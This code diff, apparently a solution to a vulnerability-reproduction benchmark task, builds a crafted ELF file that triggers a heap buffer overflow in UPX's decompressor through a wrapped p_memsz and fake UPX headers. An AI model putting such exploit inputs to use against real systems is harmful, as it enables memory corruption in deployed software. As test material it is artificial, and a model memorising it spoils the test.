@@ -2,118 +2,143 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the vulnerability.
+        poc = bytearray()
 
-        Args:
-            src_path: Path to the vulnerable source code tarball
-
-        Returns:
-            bytes: The PoC input that should trigger the vulnerability
-        """
+        # Constants for ELF structure and values
+        ehdr_size = 52
+        phdr_size = 32
+        dyn_size = 8
         
-        # This PoC is designed to trigger a heap buffer overflow in UPX's
-        # ELF decompression logic. The vulnerability stems from an internal state
-        # (related to decompression parameters like uncompressed size) not being
-        # reset between processing different program headers.
+        phnum = 3
+        page_size = 4096
+        load_addr = 0x08048000
+        
+        # Offsets within the file
+        phdr_table_offset = ehdr_size
+        dyn_table_offset = phdr_table_offset + phnum * phdr_size
+        upx_info_offset = dyn_table_offset + 2 * dyn_size
+        
+        # UPX header sizes
+        l_info_size = 28
+        p_info_size = 12
+        b_info_size = 12
+        num_blocks = 1
+        upx_header_size = 12 + l_info_size + p_info_size + num_blocks * b_info_size
+        
+        unpadded_size = upx_info_offset + upx_header_size
+        file_size = (unpadded_size + 15) & ~15
+        lsize = 10 
 
-        # The PoC is a crafted 32-bit ELF file with two program headers:
-        # 1. A PT_LOAD segment: This contains a fake UPX metadata block. We craft
-        #    this block to set a very large "uncompressed size" (u_len) in the
-        #    decompressor's internal state.
-        # 2. A PT_DYNAMIC segment: The processing of this segment, specifically
-        #    the handling of the DT_INIT entry (by a function like un_DT_INIT),
-        #    is the trigger. The stale, large u_len from the first segment is
-        #    improperly used to calculate an offset into a memory buffer (`lowmem`),
-        #    leading to an out-of-bounds write (heap buffer overflow).
-
-        # Target PoC size is 512 bytes, matching the ground-truth length.
-        poc = bytearray(512)
-
-        # --- ELF Header (52 bytes) ---
-        e_ident = b'\x7fELF\x01\x01\x01' + b'\x00' * 9  # 32-bit, LSB, System V
-        e_type = 3          # ET_DYN (Shared object file)
-        e_machine = 3       # EM_386 (Intel 80386)
-        e_version = 1
-        e_entry = 0
-        e_phoff = 52        # Program header table offset
-        e_shoff = 0         # No section headers
-        e_flags = 0
-        e_ehsize = 52       # ELF header size
-        e_phentsize = 32    # Program header entry size
-        e_phnum = 2         # Number of program headers
-        e_shentsize = 0
-        e_shnum = 0
-        e_shstrndx = 0
-
-        header_struct = struct.pack(
+        # --- ELF Header (Elf32_Ehdr) ---
+        poc += struct.pack(
             '<16sHHIIIIIHHHHHH',
-            e_ident, e_type, e_machine, e_version,
-            e_entry, e_phoff, e_shoff, e_flags,
-            e_ehsize, e_phentsize, e_phnum,
-            e_shentsize, e_shnum, e_shstrndx
+            b'\x7fELF\x01\x01\x01' + b'\x00' * 9,
+            2,          # e_type (ET_EXEC)
+            3,          # e_machine (EM_386)
+            1,          # e_version
+            load_addr,  # e_entry
+            phdr_table_offset, # e_phoff
+            0,          # e_shoff
+            0,          # e_flags
+            ehdr_size,  # e_ehsize
+            phdr_size,  # e_phentsize
+            phnum,      # e_phnum
+            0,          # e_shentsize
+            0,          # e_shnum
+            0           # e_shstrndx
         )
-        poc[0:len(header_struct)] = header_struct
 
-        # --- Program Header Table (2 * 32 = 64 bytes) at offset 52 ---
-        ph_table_offset = e_phoff
-        data_offset = ph_table_offset + e_phnum * e_phentsize  # 52 + 64 = 116
-
-        ph0_data_filesz = 24
-        ph1_data_filesz = 16
-
-        # Program Header 0: PT_LOAD (State Setter)
-        ph0_struct = struct.pack(
+        # --- Program Header Table (3 * Elf32_Phdr) ---
+        # Phdr 0: PT_LOAD. A large p_memsz causes an integer wrap-around for xct_off calculation.
+        poc += struct.pack(
             '<IIIIIIII',
-            1,                      # p_type = PT_LOAD
-            data_offset,            # p_offset
-            0x08048000,             # p_vaddr
-            0x08048000,             # p_paddr
-            ph0_data_filesz,        # p_filesz
-            0x20000,                # p_memsz (larger to mimic packed file)
-            6,                      # p_flags = RW
-            0x1000                  # p_align
+            1,              # p_type (PT_LOAD)
+            0,              # p_offset
+            load_addr,      # p_vaddr
+            load_addr,      # p_paddr
+            file_size,      # p_filesz
+            0xfffffffe,     # p_memsz
+            5,              # p_flags (R-E)
+            page_size       # p_align
         )
-        poc[ph_table_offset:ph_table_offset + 32] = ph0_struct
 
-        # Program Header 1: PT_DYNAMIC (Trigger)
-        ph1_struct = struct.pack(
+        # Phdr 1: PT_LOAD for UPX info block.
+        poc += struct.pack(
             '<IIIIIIII',
-            2,                      # p_type = PT_DYNAMIC
-            data_offset + ph0_data_filesz, # p_offset
-            0x08049000,             # p_vaddr
-            0x08049000,             # p_paddr
-            ph1_data_filesz,        # p_filesz
-            ph1_data_filesz,        # p_memsz
-            6,                      # p_flags = RW
-            4                       # p_align
+            1,                          # p_type (PT_LOAD)
+            upx_info_offset,            # p_offset
+            load_addr + upx_info_offset,# p_vaddr
+            load_addr + upx_info_offset,# p_paddr
+            upx_header_size,            # p_filesz
+            upx_header_size,            # p_memsz
+            6,                          # p_flags (RW-)
+            page_size                   # p_align
         )
-        poc[ph_table_offset + 32:ph_table_offset + 64] = ph1_struct
 
-        # --- Data Blocks (at offset 116) ---
+        # Phdr 2: PT_DYNAMIC pointing to our crafted dynamic segment.
+        poc += struct.pack(
+            '<IIIIIIII',
+            2,                          # p_type (PT_DYNAMIC)
+            dyn_table_offset,           # p_offset
+            load_addr + dyn_table_offset, # p_vaddr
+            load_addr + dyn_table_offset, # p_paddr
+            2 * dyn_size,               # p_filesz
+            2 * dyn_size,               # p_memsz
+            6,                          # p_flags (RW-)
+            4                           # p_align
+        )
 
-        # Data for PH0: Crafted UPX `b_info` block
-        # A large u_len corrupts the decompressor state.
-        u_len_bad = 0x40000000  # Large uncompressed size
-        c_len_bad = 0x10         # Small compressed size
-        method_bad = 0x08        # e.g., M_LZMA
+        # --- Dynamic Segment (2 * Elf32_Dyn) ---
+        # Dyn 0: DT_INIT entry. d_un.d_ptr makes unp_off = 0.
+        poc += struct.pack(
+            '<iI',
+            12,         # d_tag (DT_INIT)
+            load_addr   # d_un.d_ptr
+        )
+        # Dyn 1: DT_NULL to terminate the segment.
+        poc += struct.pack(
+            '<iI',
+            0,          # d_tag (DT_NULL)
+            0           # d_un.d_val
+        )
 
-        data0 = bytearray(ph0_data_filesz)
-        data0[0:4] = struct.pack('<I', u_len_bad)
-        data0[4:8] = struct.pack('<I', c_len_bad)
-        data0[8] = method_bad
-        poc[data_offset:data_offset + ph0_data_filesz] = data0
+        # --- UPX Information Block ---
+        # UPX Signature
+        poc += b'UPX!\x02\x00\x00\x00\x00\x00\x00\x00'
 
-        # Data for PH1: .dynamic section
-        # Must contain DT_INIT to exercise the vulnerable code path.
-        DT_INIT = 12
-        DT_NULL = 0
+        # l_info struct
+        poc += struct.pack(
+            '<IHBBBBB13sI',
+            0,              # l_checksum
+            0x15,           # l_version
+            1,              # l_format
+            1,              # l_method
+            0,              # l_level
+            0,              # l_ubuf_sz
+            0,              # l_sbuf_sz
+            b'\0' * 13,     # l_unused
+            file_size,      # l_filesize
+        )
+
+        # p_info struct
+        poc += struct.pack(
+            '<III',
+            0,          # p_progid
+            lsize,      # p_filesize (the `lsize` for the buffer)
+            32768,      # p_blocksize
+        )
         
-        data1 = bytearray(ph1_data_filesz)
-        # Entry 1: DT_INIT
-        data1[0:8] = struct.pack('<ii', DT_INIT, 0xdeadbeef)
-        # Entry 2: DT_NULL (terminator)
-        data1[8:16] = struct.pack('<ii', DT_NULL, 0)
-        poc[data_offset + ph0_data_filesz:data_offset + ph0_data_filesz + ph1_data_filesz] = data1
+        # b_info struct (for 1 block)
+        poc += struct.pack(
+            '<IIBBH',
+            lsize,      # b_size
+            0,          # b_cpos
+            2,          # b_method
+            0,          # b_level
+            0,          # b_unused
+        )
+        
+        # Pad file to the final size
+        poc.extend(b'\x00' * (file_size - len(poc)))
         
         return bytes(poc)
